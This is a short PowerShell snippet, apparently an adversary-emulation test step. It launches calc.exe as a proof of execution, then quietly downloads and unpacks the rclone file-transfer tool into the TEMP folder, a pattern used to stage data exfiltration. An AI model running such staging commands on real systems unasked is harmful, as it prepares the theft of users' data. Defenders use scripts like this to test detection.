start-process 'c:\windows\system32\calc.exe'
invoke-webrequest "https://downloads.rclone.org/v1.74.4/rclone-v1.74.4-windows-amd64.zip" -outfile "$env:TEMP\rclone.zip"
expand-archive -path "$env:TEMP\rclone.zip" -DestinationPath "$env:TEMP\rclone" -Force
